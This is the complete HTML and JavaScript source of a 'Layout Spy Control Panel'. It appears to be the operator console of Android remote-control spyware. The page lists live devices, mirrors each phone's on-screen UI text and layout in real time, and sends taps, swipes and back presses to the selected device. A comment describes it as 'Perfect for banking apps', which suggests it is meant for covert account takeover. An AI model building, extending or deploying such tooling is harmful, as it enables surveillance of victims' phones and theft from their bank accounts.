<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± Layout Spy Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,20,40,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00aaff;
        }
        .device { padding: 15px; margin: 10px 0; background: rgba(0,0,0,0.7); 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; border-left: 4px solid #666; }
        .device:hover { background: rgba(0,170,255,0.3); border-left-color: #00aaff; transform: translateX(5px); }
        .active { background: linear-gradient(135deg, #00ff88, #00cc66) !important; 
            color: #000; border-left-color: #00ff88 !important; }
        .disconnected { opacity: 0.4; border-left-color: #ff4444; }

        #phone-frame {
            width: 420px; height: 900px; margin: 30px auto; 
            background: linear-gradient(145deg, #1a1a1a, #0d0d0d); 
            border: 30px solid #2a2a3a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
        }
        #screen { 
            width: 100%; height: 100%; background: #000; border-radius: 35px;
            overflow: hidden; position: relative;
        }
        .ui-element {
            position: absolute; border-radius: 4px; cursor: pointer;
            transition: all 0.2s; font-size: 12px; font-weight: 500;
            border: 1px solid rgba(0,170,255,0.5); background: rgba(0,100,200,0.1);
        }
        .ui-element:hover {
            border-color: #00ff88 !important; background: rgba(0,255,136,0.2) !important;
            box-shadow: 0 0 10px rgba(0,255,136,0.5);
        }
        .ui-element.clickable { border-left: 4px solid #00ff88 !important; }
        .ui-element button { background: none; border: none; color: white; 
            font-family: inherit; cursor: pointer; width: 100%; height: 100%;
            text-align: left; padding: 8px; display: flex; align-items: center; }
        .element-text { font-size: 11px; padding: 2px 6px; white-space: nowrap; 
            overflow: hidden; text-overflow: ellipsis; max-height: 24px; display: block; }
        .element-type { font-size: 9px; opacity: 0.7; margin-top: 1px; }

        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,20,40,0.95); 
            padding: 15px; border-radius: 10px; font-size: 13px; border: 1px solid #00aaff; }
        #fps-counter { position: fixed; top: 10px; right: 220px; font-size: 13px; color: #00ff88; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 15px 35px; margin: 0 8px; background: linear-gradient(45deg, #00aaff, #0077cc); 
            color: white; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(0,170,255,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,170,255,0.6); }
        button:active { transform: translateY(0); }
        #element-info { position: fixed; top: 80px; right: 10px; background: rgba(0,0,0,0.9); 
            padding: 15px; border-radius: 10px; max-width: 250px; display: none; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">ðŸ“± Layout Spy</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>Elements: <span id="elementCount">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">Update: 0ms</div>

    <div id="phone-frame">
        <div id="screen"></div>
    </div>

    <div id="element-info">
        <div><strong id="info-text"></strong></div>
        <div style="font-size: 11px; opacity: 0.8; margin-top: 5px;" id="info-type"></div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
        <button onclick="clearElements()">ðŸ§¹ Clear</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let screenElements = [];
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastUpdate = 0;

        const screen = document.getElementById('screen');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const elementCount = document.getElementById('elementCount');
        const fpsCounter = document.getElementById('fps-counter');
        const elementInfo = document.getElementById('element-info');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = 'âœ… Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ðŸ”¥ LAYOUT RENDERING (Perfect for banking apps)
        socket.on('layout-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 1920;
            
            renderLayout(data.layout);
            updateStats(data.layout.length, performance.now() - lastUpdate);
            lastUpdate = performance.now();
        });

        function renderLayout(layoutArray) {
            screenElements.forEach(el => el.remove());
            screenElements = [];
            
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = rect.width / deviceWidth;
            const scaleY = rect.height / deviceHeight;
            
            layoutArray.forEach(node => {
                const element = createElement(node, scaleX, scaleY);
                screen.appendChild(element);
                screenElements.push(element);
            });
        }

        function createElement(node, scaleX, scaleY) {
            const div = document.createElement('div');
            div.className = `ui-element ${node.clickable ? 'clickable' : ''}`;
            div.dataset.nodeId = node.id;
            
            // Position & Size
            div.style.left = (node.x * scaleX) + 'px';
            div.style.top = (node.y * scaleY) + 'px';
            div.style.width = (node.width * scaleX) + 'px';
            div.style.height = (node.height * scaleY) + 'px';
            
            // Content
            const textContent = node.text || node.contentDesc || '';
            div.innerHTML = `
                <button onclick="tapElement('${node.id}', event)" title="${textContent}">
                    <span class="element-text">${textContent || 'No text'}</span>
                    <div class="element-type">${getTypeIcon(node)}</div>
                </button>
            `;
            
            // Hover info
            div.addEventListener('mouseenter', () => showElementInfo(node, div));
            div.addEventListener('mouseleave', () => elementInfo.style.display = 'none');
            
            return div;
        }

        function getTypeIcon(node) {
            if (node.checked) return 'âœ…';
            if (node.clickable) return 'ðŸ‘†';
            if (node.focusable) return 'ðŸŽ¯';
            return 'ðŸ“¦';
        }

        function showElementInfo(node, element) {
            document.getElementById('info-text').textContent = node.text || node.contentDesc || 'No text';
            document.getElementById('info-type').textContent = 
                `${node.className} (${node.clickable ? 'Clickable' : 'Static'})`;
            elementInfo.style.display = 'block';
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small>
                        <div style="margin-top: 5px; font-size: 12px;">
                            ${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFF'}
                        </div>
                    </div>
                `).join('') : '<div style="text-align:center;opacity:0.5;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('select-device', { deviceId });
        }

        // ðŸ”¥ PERFECT TOUCH/MOUSE COORDINATE MAPPING
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Element-specific tap
        window.tapElement = function(nodeId, event) {
            event.stopPropagation();
            const element = screenElements.find(el => el.dataset.nodeId === nodeId);
            if (element) {
                const rect = element.getBoundingClientRect();
                const coords = getScaledCoords(
                    rect.left + rect.width / 2, 
                    rect.top + rect.height / 2
                );
                sendTap(coords.x, coords.y);
            }
        };

        // Direct screen tap (fallback)
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendTap(coords.x, coords.y);
            });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function updateStats(count, updateTime) {
            elementCount.textContent = count;
            fpsCounter.textContent = `Update: ${Math.round(updateTime)}ms`;
        }

        function clearElements() {
            screenElements.forEach(el => el.remove());
            screenElements = [];
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Load initial devices
        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
